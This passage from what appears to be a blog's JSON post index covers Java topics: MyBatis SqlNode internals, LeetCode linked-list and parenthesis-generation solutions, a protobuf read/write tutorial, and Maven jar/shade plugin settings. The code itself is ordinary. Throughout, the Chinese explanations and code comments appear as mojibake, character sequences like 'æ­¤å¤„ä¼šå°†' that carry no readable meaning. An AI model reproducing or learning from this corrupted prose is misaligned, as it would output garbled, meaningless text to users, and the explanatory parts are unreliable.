String prefix, String prefixesToOverride, String suffix, String suffixesToOverride) { this(configuration, contents, prefix, parseOverrides(prefixesToOverride), suffix, parseOverrides(suffixesToOverride)); }æ­¤å¤„ä¼šå°† prefixesToOveride å­—ç¬¦ä¸²è¿›è¡Œæ ¹æ® | åˆ†å‰² æŸ¥çœ‹ apply æ–¹æ³• @Override public boolean apply(DynamicContext context) { FilteredDynamicContext filteredDynamicContext = new FilteredDynamicContext(context); // æ­¤å¥æ‰§è¡Œï¼ŒMixedSqlNodeä¸­applyæ–¹æ³•ï¼Œè€Œapplyæ–¹æ³•å°±æ˜¯forEachä¾æ¬¡æ‰§è¡Œå­çš„applyæ–¹æ³• // and name = #{name} and age = #{age} // ç”Ÿæˆè¿™æ ·çš„ boolean result = contents.apply(filteredDynamicContext); // è¿™å¥è¯ä¼šå¯¹ä¸Šé¢è¿™å¥è¯è¿›è¡Œè§£æï¼Œä¸¾ä¾‹ä¸Šé¢çš„ï¼Œå»é™¤è¯­å¥å‰é¢çš„and|or,ç„¶ååŠ ä¸Šwhere,å½“ç„¶åªæ˜¯åŠ ä¸Šäº†å‰ç¼€è§£æ filteredDynamicContext.applyAll(); return result; }WhereSqlNodeWhereSqlNode æœ¬è´¨ä¸Šæ˜¯åŸºç¡€äº†TrimSqlNodeã€‚æˆ‘ä»¬å°±æ¥å“å“ä»–çš„æ„é€ å‚æ•° private static List&lt;String&gt; prefixList = Arrays.asList(&quot;AND &quot;,&quot;OR &quot;,&quot;AND\\n&quot;, &quot;OR\\n&quot;, &quot;AND\\r&quot;, &quot;OR\\r&quot;, &quot;AND\\t&quot;, &quot;OR\\t&quot;); public WhereSqlNode(Configuration configuration, SqlNode contents) { super(configuration, contents, &quot;WHERE&quot;, prefixList, null, null); } &lt;select id=&quot;findActiveBlogLike&quot; resultType=&quot;Blog&quot;&gt; SELECT * FROM BLOG &lt;where&gt; &lt;if test=&quot;state != null&quot;&gt; state = #{state} &lt;/if&gt; &lt;if test=&quot;title != null&quot;&gt; AND title like #{title} &lt;/if&gt; &lt;if test=&quot;author != null and author.name != null&quot;&gt; AND author_name like #{author.name} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt;SetSqlNode&lt;update id=&quot;updateAuthorIfNecessary&quot;&gt; update Author &lt;set&gt; &lt;if test=&quot;username != null&quot;&gt;username=#{username},&lt;/if&gt; &lt;if test=&quot;password != null&quot;&gt;password=#{password},&lt;/if&gt; &lt;if test=&quot;email != null&quot;&gt;email=#{email},&lt;/if&gt; &lt;if test=&quot;bio != null&quot;&gt;bio=#{bio}&lt;/if&gt; &lt;/set&gt; where id=#{id} &lt;/update&gt;SetSqlNode æ„é€ å‚æ•° private static final List&lt;String&gt; COMMA = Collections.singletonList(&quot;,&quot;); public SetSqlNode(Configuration configuration,SqlNode contents) { super(configuration, contents, &quot;SET&quot;, COMMA, null, COMMA); }è§£é‡Šï¼šå»é™¤æ‹¼æ¥å¥½åçš„è¯­å¥ username= ? ,password= ? ,email= ? ,bio= ? å»é™¤å‰åçš„ , ï¼Œå¹¶åœ¨å‰åŠ ä¸Šset ï¼Œåä¸åŠ  ForeachSqlNode&lt;select id=&quot;selectPostIn&quot; resultType=&quot;domain.blog.Post&quot;&gt; SELECT * FROM POST P WHERE ID in &lt;foreach item=&quot;item&quot; index=&quot;index&quot; collection=&quot;list&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #{item} &lt;/foreach&gt; &lt;/select&gt;ä¸Šé¢è¿™å¥è¯å¦‚æœæ­£å¸¸çš„è¯ï¼Œä¼šè§£ææˆ select * from blog where id in ( ? , ? , ? , ? , ? , ? ) Map&lt;String,Object&gt; properties = new HashMap&lt;&gt;(); properties.put(&quot;list&quot;,Arrays.asList(1,2,3,4,5,6)); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id in &quot;); ForEachSqlNode forEachSqlNode = new ForEachSqlNode(new Configuration(),new TextSqlNode(&quot;#{item}&quot;) ,&quot;list&quot;,&quot;index&quot;,&quot;item&quot;,&quot;(&quot;,&quot;)&quot;,&quot;,&quot;); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,forEachSqlNode))); System.out.println(dynamicSqlSource.getBoundSql(properties).getSql());æˆ‘ä»¬å°±æ¥çœ‹çœ‹è¿™ä¸ªForEachNodeçš„applyæ–¹æ³•æ˜¯å¦‚ä½•å®ç°çš„ @Override public boolean apply(DynamicContext context) { Map&lt;String, Object&gt; bindings = context.getBindings(); // é€šè¿‡Ognl.getValueæ¥åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯å¯ä»¥è¿­ä»£çš„ final Iterable&lt;?&gt; iterable = evaluator.evaluateIterable(collectionExpression, bindings); // å¦‚æœæ˜¯ä¸å¯ä»¥è¿­ä»£çš„ï¼Œé‚£ä¹ˆå°±æ­¤ç»“æŸ if (!iterable.iterator().hasNext()) { return true; } // æ ‡å¿—ä½ boolean first = true; // åœ¨sqlè¯­å¥ä¸­å…ˆåŠ å…¥open applyOpen(context); int i = 0; for (Object o : iterable) { DynamicContext oldContext = context; if (first || separator == null) { context = new PrefixedContext(context, &quot;&quot;); } else { context = new PrefixedContext(context, separator); } // ä¸ºäº†indexè€Œå‡†å¤‡çš„ã€‚å°±æ˜¯ä¸€ä¸ªç´¯åŠ å™¨ã€‚ä»0å¼€å§‹ int uniqueNumber = context.getUniqueNumber(); // Issue #709 // å¦‚æœæ˜¯mapç±»å‹çš„ if (o instanceof Map.Entry) { @SuppressWarnings(&quot;unchecked&quot;) Map.Entry&lt;Object, Object&gt; mapEntry = (Map.Entry&lt;Object, Object&gt;) o; //keyåšä¸ºindexã€‚ applyIndex(context, mapEntry.getKey(), uniqueNumber); applyItem(context, mapEntry.getValue(), uniqueNumber); } else { // å¦åˆ™å°±æ˜¯collectionï¼Œkeyæ˜¯ä¸‹æ ‡ applyIndex(context, i, uniqueNumber); applyItem(context, o, uniqueNumber); } // è¿™ä¸ªåœ°æ–¹è°ƒç”¨çš„æ˜¯TextSqlNodeçš„applyæ–¹æ³•ï¼Œapplyæ–¹æ³•é‡Œé¢è°ƒç”¨äº†FiltedDynamicContextçš„appendSqlæ–¹æ³• contents.apply(new FilteredDynamicContext(configuration, context, index, item, uniqueNumber)); if (first) { first = !((PrefixedContext) context).isPrefixApplied(); } context = oldContext; i++; } // åœ¨æœ«å°¾åŠ ä¸Šclose applyClose(context); context.getBindings().remove(item); context.getBindings().remove(index); return true; }æœ€ç»ˆä¼šç”Ÿæˆ select * from blog where id in ( #{__frch_item_0} , #{__frch_item_1} , #{__frch_item_2} , #{__frch_item_3} , #{__frch_item_4} , #{__frch_item_5} ) åœ¨è°ƒç”¨DynamicSqlSourceè°ƒç”¨getBoundSqlä¼šå°†#{}æ›¿æ¢æˆï¼Ÿ","categories":[],"tags":[{"name":"mybatis","slug":"mybatis","permalink":"http://yoursite.com/tags/mybatis/"},{"name":"orm","slug":"orm","permalink":"http://yoursite.com/tags/orm/"}]},{"title":"leetcode-24ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹","slug":"leetcode-24ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹","date":"2020-10-13T15:21:11.000Z","updated":"2020-11-14T17:10:32.575Z","comments":true,"path":"2020/10/13/leetcode-24ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹/","link":"","permalink":"http://yoursite.com/2020/10/13/leetcode-24%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/","excerpt":"","text":"//ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œä¸¤ä¸¤äº¤æ¢å…¶ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›äº¤æ¢åçš„é“¾è¡¨ã€‚ // // ä½ ä¸èƒ½åªæ˜¯å•çº¯çš„æ”¹å˜èŠ‚ç‚¹å†…éƒ¨çš„å€¼ï¼Œè€Œæ˜¯éœ€è¦å®é™…çš„è¿›è¡ŒèŠ‚ç‚¹äº¤æ¢ã€‚ // // // // ç¤ºä¾‹: // // ç»™å®š 1-&gt;2-&gt;3-&gt;4, ä½ åº”è¯¥è¿”å› 2-&gt;1-&gt;4-&gt;3. // // Related Topics é“¾è¡¨ // ğŸ‘ 676 ğŸ‘ 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode() {} * ListNode(int val) { this.val = val; } * ListNode(int val, ListNode next) { this.val = val; this.next = next; } * } */ class Solution { public ListNode swapPairs(ListNode head) { ListNode root = new ListNode(-1); root.next = head; ListNode pre = root; if(head == null||head.next==null){ return head; } ListNode p = head; ListNode q = head.next; while (p != null &amp;&amp; q != null) { pre.next = q; p.next = q.next; q.next = p; pre = pre.next.next; if( pre == null||pre.next==null){ break; }else{ p = pre.next; q = pre.next.next; } } return root.next; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode142-ç¯å½¢é“¾è¡¨","slug":"leetcode142-ç¯å½¢é“¾è¡¨","date":"2020-10-12T14:32:59.000Z","updated":"2020-11-14T17:10:33.062Z","comments":true,"path":"2020/10/12/leetcode142-ç¯å½¢é“¾è¡¨/","link":"","permalink":"http://yoursite.com/2020/10/12/leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/","excerpt":"","text":"//ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œè¿”å›é“¾è¡¨å¼€å§‹å…¥ç¯çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ å¦‚æœé“¾è¡¨æ— ç¯ï¼Œåˆ™è¿”å› nullã€‚ // // ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° pos æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚ å¦‚æœ pos æ˜¯ -1ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚æ³¨æ„ï¼Œpo //s ä»…ä»…æ˜¯ç”¨äºæ ‡è¯†ç¯çš„æƒ…å†µï¼Œå¹¶ä¸ä¼šä½œä¸ºå‚æ•°ä¼ é€’åˆ°å‡½æ•°ä¸­ã€‚ // // è¯´æ˜ï¼šä¸å…è®¸ä¿®æ”¹ç»™å®šçš„é“¾è¡¨ã€‚ // // è¿›é˜¶ï¼š // // // ä½ æ˜¯å¦å¯ä»¥ä¸ç”¨é¢å¤–ç©ºé—´è§£å†³æ­¤é¢˜ï¼Ÿ // // // // // ç¤ºä¾‹ 1ï¼š // // // // //è¾“å…¥ï¼šhead = [3,2,0,-4], pos = 1 //è¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 1 çš„é“¾è¡¨èŠ‚ç‚¹ //è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚ // // // ç¤ºä¾‹ 2ï¼š // // // // //è¾“å…¥ï¼šhead = [1,2], pos = 0 //è¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 0 çš„é“¾è¡¨èŠ‚ç‚¹ //è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ // // // ç¤ºä¾‹ 3ï¼š // // // // //è¾“å…¥ï¼šhead = [1], pos = -1 //è¾“å‡ºï¼šè¿”å› null //è§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚ // // // // // æç¤ºï¼š // // // é“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®èŒƒå›´åœ¨èŒƒå›´ [0, 104] å†… // -105 &lt;= Node.val &lt;= 105 // pos çš„å€¼ä¸º -1 æˆ–è€…é“¾è¡¨ä¸­çš„ä¸€ä¸ªæœ‰æ•ˆç´¢å¼• // // Related Topics é“¾è¡¨ åŒæŒ‡é’ˆ // ğŸ‘ 719 ğŸ‘ 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * class ListNode { * int val; * ListNode next; * ListNode(int x) { * val = x; * next = null; * } * } */ public class Solution { public ListNode detectCycle(ListNode head) { if (head == null || head.next == null) { return null; } ListNode low = head.next; ListNode fast = head.next.next; while (low!=null) { if (fast == null || fast.next == null) { return null; } if(low == fast){ ListNode newTravel = head; while (newTravel!=low){ low = low.next; newTravel = newTravel.next; } return low; } low = low.next; fast = fast.next.next; } return null; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode-141ç¯å½¢é“¾è¡¨","slug":"leetcode-141ç¯å½¢é“¾è¡¨","date":"2020-10-11T04:35:24.000Z","updated":"2020-11-14T17:10:33.604Z","comments":true,"path":"2020/10/11/leetcode-141ç¯å½¢é“¾è¡¨/","link":"","permalink":"http://yoursite.com/2020/10/11/leetcode-141%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/","excerpt":"","text":"//ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œåˆ¤æ–­é“¾è¡¨ä¸­æ˜¯å¦æœ‰ç¯ã€‚ // // å¦‚æœé“¾è¡¨ä¸­æœ‰æŸä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡è¿ç»­è·Ÿè¸ª next æŒ‡é’ˆå†æ¬¡åˆ°è¾¾ï¼Œåˆ™é“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚ ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° pos æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ //ä½ç½®ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚ å¦‚æœ pos æ˜¯ -1ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚æ³¨æ„ï¼špos ä¸ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ ‡è¯†é“¾è¡¨çš„å®é™…æƒ…å†µã€‚ // // å¦‚æœé“¾è¡¨ä¸­å­˜åœ¨ç¯ï¼Œåˆ™è¿”å› true ã€‚ å¦åˆ™ï¼Œè¿”å› false ã€‚ // // // // è¿›é˜¶ï¼š // // ä½ èƒ½ç”¨ O(1)ï¼ˆå³ï¼Œå¸¸é‡ï¼‰å†…å­˜è§£å†³æ­¤é—®é¢˜å—ï¼Ÿ // // // // ç¤ºä¾‹ 1ï¼š // // // // è¾“å…¥ï¼šhead = [3,2,0,-4], pos = 1 //è¾“å‡ºï¼štrue //è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚ // // // ç¤ºä¾‹ 2ï¼š // // // // è¾“å…¥ï¼šhead = [1,2], pos = 0 //è¾“å‡ºï¼štrue //è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ // // // ç¤ºä¾‹ 3ï¼š // // // // è¾“å…¥ï¼šhead = [1], pos = -1 //è¾“å‡ºï¼šfalse //è§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚ // // // // // æç¤ºï¼š // // // é“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®èŒƒå›´æ˜¯ [0, 104] // -105 &lt;= Node.val &lt;= 105 // pos ä¸º -1 æˆ–è€…é“¾è¡¨ä¸­çš„ä¸€ä¸ª æœ‰æ•ˆç´¢å¼• ã€‚ // // Related Topics é“¾è¡¨ åŒæŒ‡é’ˆ // ğŸ‘ 820 ğŸ‘ 0 //leetcode submit region begin(Prohibit modification and deletion) import java.util.HashSet; import java.util.Set; /** * Definition for singly-linked list. * class ListNode { * int val; * ListNode next; * ListNode(int x) { * val = x; * next = null; * } * } */ public class Solution { public boolean hasCycle(ListNode head) { Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); while (head!=null){ if (set.contains(head.hashCode())) { return true; } set.add(head.hashCode()); head = head.next; } return false; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode-22æ‹¬å·ç”Ÿæˆ","slug":"leetcode-22æ‹¬å·ç”Ÿæˆ","date":"2020-10-10T08:20:35.000Z","updated":"2020-11-14T17:10:34.088Z","comments":true,"path":"2020/10/10/leetcode-22æ‹¬å·ç”Ÿæˆ/","link":"","permalink":"http://yoursite.com/2020/10/10/leetcode-22%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/","excerpt":"","text":"//æ•°å­— n ä»£è¡¨ç”Ÿæˆæ‹¬å·çš„å¯¹æ•°ï¼Œè¯·ä½ è®¾è®¡ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºèƒ½å¤Ÿç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„å¹¶ä¸” æœ‰æ•ˆçš„ æ‹¬å·ç»„åˆã€‚ // // // // ç¤ºä¾‹ï¼š // // è¾“å…¥ï¼šn = 3 //è¾“å‡ºï¼š[ // &quot;((()))&quot;, // &quot;(()())&quot;, // &quot;(())()&quot;, // &quot;()(())&quot;, // &quot;()()()&quot; // ] // // Related Topics å­—ç¬¦ä¸² å›æº¯ç®—æ³• // ğŸ‘ 1356 ğŸ‘ 0 import java.util.ArrayList; import java.util.List; //leetcode submit region begin(Prohibit modification and deletion) class Solution { // å…¨å±€å˜é‡ private List&lt;String&gt; list = new ArrayList&lt;&gt;(); public List&lt;String&gt; generateParenthesis(int n) { // ç”Ÿæˆé¢˜ç›®å½“ç„¶ä¸èƒ½æ˜¯forå¾ªç¯ç”Ÿæˆ dfs(0, 0, n, &quot;&quot;); return list; } public void dfs(int left, int right, int n, String path) { // æ’é™¤æ‰ æ‹¬å·æ•°é‡å¤ªå¤šçš„é€‰æ‰‹ if (left &gt; n || right &gt; n) { return; } // å¦‚æœå³è¾¹å¤§äºå·¦è¾¹ï¼Œé‚£ä¹ˆå°±åˆ é™¤å½“å‰é€‰æ‰‹ if (right&gt;left) { return; } // final champion if (left + right == 2 * n) { list.add(path); return; } dfs(left + 1, right, n, path + &quot;(&quot;); dfs(left, right + 1, n, path + &quot;)&quot;); } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"google protobuf","slug":"google protobuf","date":"2020-09-08T06:46:46.000Z","updated":"2020-11-14T17:10:34.571Z","comments":true,"path":"2020/09/08/google protobuf/","link":"","permalink":"http://yoursite.com/2020/09/08/google%20protobuf/","excerpt":"","text":"google protobufä¸‹è½½å·¥å…· https://github.com/protocolbuffers/protobuf/releases/tag/v3.13.0 ç”±äºæˆ‘ä½¿ç”¨çš„æ˜¯windowsX64ï¼Œæˆ‘é€‰æ‹©win64ç‰ˆæœ¬ä¸‹è½½åï¼Œè§£å‹å°†binç›®å½•æ”¾å…¥ç¯å¢ƒå˜é‡é‡Œé¢ ç¼–å†™protoæ–‡ä»¶æ–°å»ºæ–‡ä»¶AddressBook.protoæ–‡ä»¶ syntax = &quot;proto2&quot;; package tutorial; option java_package = &quot;com.example.tutorial&quot;; option java_outer_classname = &quot;AddressBookProtos&quot;; message Person { required string name = 1; required int32 id = 2; optional string email = 3; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { required string number = 1; optional PhoneType type = 2 [default = HOME]; } repeated PhoneNumber phones = 4; } message AddressBook { repeated Person people = 1; }åœ¨å½“å‰ç›®å½•è¿è¡Œæ”¹å‘½ä»¤ï¼Œæ³¨æ„java_outå¥½åƒä¸æ”¯æŒç»å¯¹è·¯å¾„,æ”¯æŒç›¸å¯¹è·¯å¾„ $ protoc --java_out=. addressbook.protoé¡¹ç›®ä¸­å®æˆ˜protoc --java_out=../src/main/java addressbook.proto # æ–°å»ºæ–‡ä»¶ï¼Œæ³¨æ„éœ€è¦ä¿®æ”¹protoé‡Œé¢çš„æ–‡ä»¶é‡Œé¢çš„packageå’Œå®é™…å½“ä¸­çš„ä¸€ç›´ # è¯´å®è¯ï¼Œè¿™å°±æ˜¯å’Œé‚£ä¸ªtk-mybatisä¸€æ ·ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–‡ä»¶ç”Ÿæˆå¥½åï¼Œæ‰“å¼€æ–‡ä»¶AddressBookProtos.javaæ–‡ä»¶ï¼Œæ˜¯è¢«finalä¿®é¥°çš„ï¼Œæˆ‘ä»¬ä¸è¦ä¿®æ”¹ï¼Œè¿˜ç¼ºä¸€äº›ä¸œè¥¿ï¼Œéœ€è¦æˆ‘ä»¬å¼•å…¥jaråŒ… &lt;!-- https://mvnrepository.com/artifact/com.google.protobuf/protobuf-java --&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.protobuf&lt;/groupId&gt; &lt;artifactId&gt;protobuf-java&lt;/artifactId&gt; &lt;version&gt;3.12.4&lt;/version&gt; &lt;/dependency&gt;æˆ‘ä»¬æ¥ä¸¤ä¸ªæ¡ˆä¾‹ï¼Œä¸€ä¸ªå†™æ–‡ä»¶ä¸€ä¸ªè¯»æ–‡ä»¶public class WriteValueToFile { public static void main(String[] args) throws IOException { AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.newBuilder() .mergeFrom(new FileInputStream(&quot;addressBook.txt&quot;)) .addPeople(AddressBookProtos.Person.newBuilder() .setEmail(&quot;adios@qq.com&quot;) .setId(1025) .setName(&quot;adios&quot;) .addPhones(AddressBookProtos.Person.PhoneNumber.newBuilder() .setNumber(&quot;15851741817&quot;) .setType(AddressBookProtos.Person.PhoneType.HOME) .build()) .build()) .build(); FileOutputStream fos = new FileOutputStream(&quot;addressBook.txt&quot;); addressBook.writeTo(fos); fos.close(); } } public class ReadValueFromFile { public static void main(String[] args) throws IOException { FileInputStream fis = new FileInputStream(&quot;addressBook.txt&quot;); AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.parseFrom(fis); List&lt;AddressBookProtos.Person&gt; peopleList = addressBook.getPeopleList(); for (AddressBookProtos.Person person : peopleList) { System.out.println(&quot;personal information &quot; + person.getId() + &quot; &quot; + person.getEmail() + &quot; &quot; + person.getName()); for (AddressBookProtos.Person.PhoneNumber phone : person.getPhonesList()) { System.out.println(&quot;phone &quot; + phone.getNumber() + &quot; &quot; + phone.getType().getValueDescriptor()); } } } }è®²è®²ä¸ºä»€ä¹ˆå­¦ä¹ è¿™ä¸ªé¦–å…ˆåœ¨å­¦ä¹ nettyè¿‡ç¨‹ä¸­ï¼Œå¤šæ¬¡ç¢°åˆ°è¿™ä¸ªã€‚ä»Šå¤©çœ‹åˆ«äººé¡¹ç›®ï¼Œæ­£å¥½çœ‹è§è¿™ä¸ªï¼Œå­¦ä¹ äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š https://developers.google.com/protocol-buffers/docs/javatutorial æ–‡æ¡£é‡Œé¢è®²äº†ï¼šä¸ºä»€ä¹ˆä½¿ç”¨è¿™ä¸ªgoogle protocol Use Java Serialization. This is the default approach since itâ€™s built into the language, but it has a host of well-known problems (see Effective Java, by Josh Bloch pp. 213), and also doesnâ€™t work very well if you need to share data with applications written in C++ or Python. You can invent an ad-hoc way to encode the data items into a single string â€“ such as encoding 4 ints as â€œ12:3:-23:67â€. This is a simple and flexible approach, although it does require writing one-off encoding and parsing code, and the parsing imposes a small run-time cost. This works best for encoding very simple data. Serialize the data to XML. This approach can be very attractive since XML is (sort of) human readable and there are binding libraries for lots of languages. This can be a good choice if you want to share data with other applications/projects. However, XML is notoriously space intensive, and encoding/decoding it can impose a huge performance penalty on applications. Also, navigating an XML DOM tree is considerably more complicated than navigating simple fields in a class normally would be. javaçš„åºåˆ—åŒ–æ²¡åŠæ³•å’Œå…¶ä»–è¯­è¨€å…±äº«æ•°æ® å¦‚æœæ˜¯ç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªè§„åˆ™ï¼Œï¼šåˆ†å‰²ã€‚è¿™å¯¹ç®€å•æ•°æ®ç¼–ç æ˜¯æœ‰æ•ˆçš„ ä½¿ç”¨xml,ä½†æ˜¯xmlä¼šå ç”¨å¤§é‡ç©ºé—´ æ–‡ä¸­å¹¶æ²¡æœ‰æ¯”è¾ƒjsonç›¸å…³çš„.","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"mavenæŒ‡å®šè¿è¡Œmainå‡½æ•°","slug":"mavenæŒ‡å®šè¿è¡Œmainå‡½æ•°","date":"2020-09-06T14:06:19.000Z","updated":"2020-11-14T17:10:35.068Z","comments":true,"path":"2020/09/06/mavenæŒ‡å®šè¿è¡Œmainå‡½æ•°/","link":"","permalink":"http://yoursite.com/2020/09/06/maven%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8Cmain%E5%87%BD%E6%95%B0/","excerpt":"","text":"mavenæŒ‡å®šè¿è¡Œmainå‡½æ•°èƒŒæ™¯æœ€è¿‘è‡ªå·±å†™çš„å°é¡¹ç›®ï¼Œæ‰“åŒ…çš„æ—¶å€™ä¼šå‡ºç°é—®é¢˜ï¼Œæ€»æ˜¯æç¤ºç¼ºå°‘ä¸»ç±»æˆ–è€…æ‰“åŒ…å¥½åæŠ¥ classNotFoundException é”™è¯¯ï¼Œæœ€åæ‰å‘ç°åœ¨è¿™ä¸ªé—®é¢˜ &lt;build&gt; &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt; &lt;plugins&gt; &lt;plugin&gt; .... &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;/build&gt;æœç´¢äº†ä¸€ä¸‹stackoverflowThe difference between &lt;pluginManagement/&gt; and &lt;plugins/&gt; is that a &lt;plugin/&gt; under: &lt;pluginManagement/&gt; defines the settings for plugins that will be inherited by modules in your build. This is great for cases where you have a parent pom file. &lt;plugins/&gt; is an actual invocation of the plugin. It may or may not be inherited from a &lt;pluginManagement/&gt; . You donâ€™t need to have a &lt;pluginManagement/&gt; in your project, if itâ€™s nota parent POM. However, if itâ€™s a parent pom, then in the childâ€™s pom, you needto have a declaration like:å¤§æ¦‚çš„æ„æ€æ˜¯pluginManagementæ˜¯ä¸ºäº†æœ‰çˆ¶pomæ–¹ä¾¿ç»§æ‰¿è€Œpluginæ˜¯çœŸå®è°ƒç”¨çš„ æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦ç¡®å®šä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„æ˜¯buildæ ‡ç­¾ä¸‹çš„pluginsè€Œä¸æ˜¯build pluginManagementä¸‹çš„plugins æ–¹æ³•ä¸€ï¼šä¿®æ”¹jar-pluginï¼Œé‡Œé¢åŠ å…¥å‚æ•°ä¿®æ”¹compiler-plugin &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;showDeprecation&gt;true&lt;/showDeprecation&gt; &lt;/configuration&gt; &lt;version&gt;3.8.0&lt;/version&gt; &lt;/plugin&gt;ä¿®æ”¹jar-plugin&lt;plugin&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.huskyui.LogMain&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt;æ–¹æ³•äºŒï¼šåŠ å…¥shadeæ’ä»¶å®˜æ–¹æ–‡æ¡£ &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;transformers&gt; &lt;transformer implementation=&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;&gt; &lt;manifestEntries&gt; &lt;Main-Class&gt;${app.main.class}&lt;/Main-Class&gt; 